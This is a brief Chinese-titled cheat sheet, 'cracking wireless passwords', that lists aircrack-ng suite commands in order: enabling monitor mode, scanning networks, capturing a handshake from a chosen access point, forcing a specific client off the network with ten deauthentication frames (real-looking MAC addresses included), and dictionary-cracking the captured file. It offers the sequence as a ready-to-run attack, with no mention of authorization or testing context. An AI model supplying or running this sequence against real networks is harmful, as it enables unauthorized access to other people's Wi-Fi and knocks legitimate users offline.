# 破解无线密码
* airmon-ng check kill
* airmon-ng start wlan0
* airodump-ng wlan0mon
* airodump-ng -w capfile -c 11 --bssid [BSSID]  wlan0mon
* aireplay-ng -0 10 -a 3C:46:D8:99:22:84 -c 64:B4:73:40:60:5C  wlan0mon  --ignore-negative-one
* aircrack-ng -w work/破解字典/超级字典/wordlist.txt  capfile-01.cap
